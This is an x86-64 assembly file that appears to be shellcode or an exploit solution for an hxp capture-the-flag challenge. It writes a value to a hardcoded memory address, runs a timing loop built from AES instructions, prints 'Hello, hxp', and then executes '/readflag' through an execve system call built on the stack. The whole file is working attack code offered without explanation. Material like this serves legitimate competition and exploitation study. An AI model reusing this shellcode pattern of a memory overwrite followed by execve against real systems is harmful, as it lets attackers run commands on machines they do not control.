
        global _start

        section .text write exec
        _start:
            ;call timeout
            mov rcx, 0x5823dcb0
            mov qword [rcx], 0x00000000580e45a1
            call timeout
            mov rdi, 1
            mov rsi, message
            mov rdx, 10
            mov rax, 1
            syscall
        
            push 0x67
        mov rax, 0x616c66646165722f
        push rax
        mov rdi, rsp
        xor edx, edx
        xor esi, esi
        push 0x3b
        pop rax
        syscall

        mov rdi, 0
        mov rax, 0x3c
        syscall

            ret
            ;mov qword [rsp+rdi], rax

            
        timeout:
            mov rcx, 0
            loop:
                inc rcx
                cmp rcx, 0x100000
                pxor       xmm5,  xmm0
                aesenc     xmm6,  xmm0
                aesenc     xmm7,  xmm0
                aesenc     xmm8,  xmm0
                aesenc     xmm9,  xmm0
                aesenc     xmm10, xmm0
                aesenc     xmm11, xmm0
                aesenc     xmm12, xmm0
                aesenc     xmm13, xmm0
                aesenc     xmm14, xmm0
                aesenclast xmm15, xmm0
                jne loop
            ret

        section .data
        message: db "Hello, hxp", 10
        path: db "/readflag"
    